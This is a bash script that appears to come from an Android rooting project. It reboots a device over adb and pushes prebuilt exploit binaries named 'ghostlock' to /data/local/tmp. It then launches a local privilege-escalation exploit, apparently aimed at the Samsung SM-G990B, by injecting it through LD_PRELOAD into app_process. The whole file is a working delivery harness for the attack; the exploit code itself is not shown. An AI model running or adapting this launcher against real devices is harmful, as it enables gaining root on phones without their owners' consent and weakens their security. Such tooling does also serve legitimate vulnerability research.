#!/usr/bin/env bash
set -euo pipefail

repo=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
serial=${1:-${ADB_SERIAL:-}}
adb_cmd=(adb)
if [[ -n $serial ]]; then
  adb_cmd+=(-s "$serial")
fi

exploit="$repo/prebuilt/ghostlock-sm-g990b"
helper="$repo/prebuilt/ghostlock-root"
[[ -x $exploit && -x $helper ]] || {
  echo "missing prebuilt binaries; run make and copy build outputs into prebuilt/" >&2
  exit 1
}

echo '[*] forcing a clean reboot'
"${adb_cmd[@]}" reboot
"${adb_cmd[@]}" wait-for-device
for _ in $(seq 1 150); do
  [[ $("${adb_cmd[@]}" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r') == 1 ]] && break
  sleep 2
done
[[ $("${adb_cmd[@]}" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r') == 1 ]] || {
  echo 'boot did not complete within 300 seconds' >&2
  exit 1
}

"${adb_cmd[@]}" push "$exploit" /data/local/tmp/ghostlock-sm-g990b >/dev/null
"${adb_cmd[@]}" push "$helper" /data/local/tmp/ghostlock-root >/dev/null
"${adb_cmd[@]}" shell 'chmod 755 /data/local/tmp/ghostlock-sm-g990b /data/local/tmp/ghostlock-root'

"${adb_cmd[@]}" shell \
  "cd /data/local/tmp && \
   CONTROLLED_RECLAIM=1 READINESS_PAUSE=1 READINESS_PTE_MB=16384 \
   EXPLOIT_ATTEMPTS=1 EXPLOIT_ATTEMPT_TIMEOUT_SEC=900 \
   LD_PRELOAD=./ghostlock-sm-g990b \
   /system/bin/app_process / --nice-name=ghostlock \
   com.android.commands.am.Am start -n com.android.settings/.Settings"

echo '[+] exploit returned successfully; verify with scripts/verify-root.sh'
